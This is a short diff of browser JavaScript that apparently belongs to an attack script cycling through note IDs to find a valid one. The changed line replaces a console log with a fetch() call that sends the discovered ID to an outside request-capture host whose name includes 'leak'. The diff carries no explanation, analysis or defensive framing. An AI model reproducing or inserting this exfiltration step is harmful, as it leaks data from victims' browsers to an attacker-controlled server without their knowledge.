@@ -73,7 +73,7 @@
                         loadNextNote(currentIndex);
                     } else if (valid >= 4) {
                         foundId = currentIndex;
-                        console.log(`Valid ID found: ${foundId}`);
+                        fetch("https://rootmexsleak.free.beeceptor.com/" + foundId);
                         startSearch(foundId, "");
                     } else {
                         loadNextNote(currentIndex + 1);
